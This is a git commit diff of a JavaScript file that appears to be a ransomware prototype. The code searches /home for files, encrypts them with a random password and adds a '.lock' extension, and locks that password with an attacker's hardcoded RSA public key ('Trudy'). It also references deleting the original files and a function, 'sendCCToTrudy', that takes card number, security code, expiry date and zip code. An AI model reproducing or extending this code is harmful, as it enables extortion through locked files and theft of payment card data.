ce290c95d866177be4cd73a367a1a74e710ea497
nilay <nilay@localhost.localdomain>
2017-04-18 09:50:55 -0400

    Working File encryption Decryption

--- js/crypto.js
+++ js/crypto.js
@@ -2,14 +2,14 @@ var fileFinder = require('fs-finder');
 var fileStream = require('fs');
 var ursa = require('ursa');
 var encryptor = require('file-encryptor');
-var options = { algorithm: 'aes256' };
+//var options = { algorithm: 'aes256' };
 
 
 var pubkeyTrudy = '-----BEGIN PUBLIC KEY-----\n'+
 'MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDZSCnqlU26QVvPINDZ5Om4nSG0\n'+
 'lLIbzgpEh4IEo9CFIN8E29LrqdW+D3p6mAjy2QO882ogMqjsrPhH3XSg/C46QcSg\n'+
 '1wXfv0p6qN1uIOvtVU1ItZ0l9TFwhC/mjhWoPWSEiSa3Ccw8g80iTExOzXVTjZp9\n'+
-'mQmilgQsNiTzlPmGgQIDAQAB\n'+
+'mQmilgQsNiTzlPmGgQIDAQAB\n'+	
 '-----END PUBLIC KEY-----\n';
 var encryptedKey='';
 
@@ -20,32 +20,18 @@ algorithm = 'aes-256-ctr'
 var files = fileFinder.from('/home').findFiles('*.foo');
 var encryptedFiles = [];
 
-// function encrypt(text){
-//   var cipher = crypto.createCipher(algorithm,password)
-//   var crypted = cipher.update(text,'utf8','hex')
-//   crypted += cipher.final('hex');
-//   return crypted;
-// }
 var secureRandom = require('secure-random-string');
 var password = secureRandom(64);
-function decrypt(text){
-  var decipher = crypto.createDecipher(algorithm,password)
-  var dec = decipher.update(text,'hex','utf8')
-  dec += decipher.final('utf8');
-  console.log("Gotcha");
-  console.log(dec);
-  return dec;
-}
 
 function encryptFiles(files){
-	//var secureRandom = require('secure-random-string');
+  //var secureRandom = require('secure-random-string');
   //var password = secureRandom(64);
   var pubkey = ursa.createPublicKey(pubkeyTrudy);
   encryptedKey = pubkey.encrypt(password, 'utf8', 'base64');
-
-  files.forEach(function(file) { 
-   encryptor.encryptFile(file, file+'.lock', password, options, function(err) {
-     console.log('Cannot encrypt: ' + file);
+  
+files.forEach(function(file) { 
+   encryptor.encryptFile(file, file+'.lock', password, function(err) {
+     //console.log('Cannot encrypt: ' + file);
    });
    encryptedFiles.push(file +'.lock');
  });
@@ -53,10 +39,10 @@ function encryptFiles(files){
 
 function deCryptFiles(key){
   //var deCipher = crypto.createDecipher(algorithm, key);
-
+  console.log(key)
   encryptedFiles.forEach(function(file) {
    encryptor.decryptFile(file, file + '.foo', key, options, function(err) {
-    console.log('Cannot de the file: '+ file);
+    console.log('Cannot decrypt the file: '+ file);
    });
   });
 }
@@ -94,15 +80,19 @@ function sendCCToTrudy(cardNumber, backNumbers, expiryDate, zip) {
 
 var hw = "Hello World";
 
-encryptFiles(files);
-deleteOriginalFiles(files);
-console.log(encryptedFiles);
-console.log('Encrypted');
+function RunRansomeWare() {
+ 
+}
+//encryptFiles(files);
+//deleteOriginalFiles(files);
+//console.log(encryptedFiles);
+//console.log('Encrypted');
 
 console.log('DeCrypting now........\n\n');
-
 deCryptFiles(password);
-
+//encryptor.decryptFile('/home/nilay/Pictures/pic1.foo.lock', '/home/nilay/Pictures/pic1.foo.lock' + '.foo', //'_rctttamQ823QgvzJGzFx6wSC6KOoynW', function(err) {
+//    console.log('Cannot decrypt the file: '+ '/home/nilay/Pictures/pic1.foo.lock');
+//   });
 
 //console.log(currentPath);
 
